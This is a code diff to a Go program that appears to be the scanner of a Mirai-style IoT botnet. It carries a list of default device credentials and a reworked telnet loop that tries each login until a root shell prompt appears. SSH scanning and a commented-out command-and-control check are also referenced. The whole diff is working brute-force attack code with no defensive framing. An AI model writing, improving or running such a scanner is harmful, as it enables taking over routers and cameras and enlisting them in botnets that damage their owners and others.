@@ -5,7 +5,7 @@ import (
 	"net"
 	"strings"
 	"time"
-	"bufio"
+
 	"golang.org/x/crypto/ssh"
 )
 
@@ -13,9 +13,9 @@ var (
 	MAlist = [][]string{
 
         {"root", "vizxv"},
-        {"root", "admin"},
-        {"admin", "admin"},
 		{"admin", "password"},
+		{"root", "admin"},
+		{"admin", "admin"},
         {"root", "888888"},
         {"root", "xmhdipc"},
         {"root", "default"},
@@ -123,27 +123,56 @@ func isTelnetOpen(ip string) {
 	if err == nil {
 		fmt.Printf("[Scanner] Found IP address: %s\n", ip)
 		pindex:=0
+		user:=""
+		password:=""
+		user,password = getCredentials(pindex)
 		for{
-			user,password := getCredentials(pindex)
-			reader := bufio.NewReader(conn)
-			reader.ReadString('\n')
-			fmt.Fprintf(conn, user+"\n")
-			userMsg, _ := reader.ReadString('\n')
-			fmt.Println(userMsg)
-			fmt.Fprintf(conn, password+"\n")
-			passMsg, _ := reader.ReadString('\n')
-			fmt.Println(passMsg)
-			if strings.Contains(passMsg,"#"){
-				break
-			}else{
-				pindex++
+			s:=""
+			try_times:=0
+			for {
+				time.Sleep(1*time.Second)
+				buf := make([]byte, 256)
+				conn_word,err:=conn.Read(buf)
+				if err==nil{
+					s = string(buf[:conn_word])
+					//fmt.Println(s)
+					if strings.Contains(s,"incorrect"){
+						pindex++
+						user,password = getCredentials(pindex)
+						if pindex >= len(MAlist){
+							break
+					}	
+					}
+					if strings.Contains(s,"#"){
+						fmt.Println("Sucessful")
+						return 
+					}
+					if strings.Contains(s,"login")||strings.Contains(s,"Password"){
+						break
+					}
+					
+				}else{
+					return
+				}
+				try_times++
+				if try_times>5{
+					fmt.Println("Retry Max! please try again")
+					return
+				}
+			}	
+			if strings.Contains(s,"login")||strings.Contains(s,"Login")||strings.Contains(s,"username"){
+				conn.Write([]byte(user+"\n"))
 			}
-			fmt.Println(userMsg)
+			if strings.Contains(s,"password")||strings.Contains(s,"Password"){
+				conn.Write([]byte(password+"\n"))
+			}
+			//fmt.Println("------------------------------")
 		}
 	}else {
-		fmt.Println("無法連接到設備：%s\n", err)
+		return 
 	}
 }
+
 
 func isSSHOpen(ip string) {
 	pindex := 0
@@ -232,7 +261,8 @@ func Scanner(choose int) {
 
 func main() {
 	fmt.Println("[Scanner] Scanner process started ..")
-	isTelnetOpen("192.168.1.198")
+	//isSSHOpen("192.168.1.163")
+	isTelnetOpen("192.168.1.181")
 	//go validateC2() // Test to connect remote DB
 	//Scanner(2)
 }
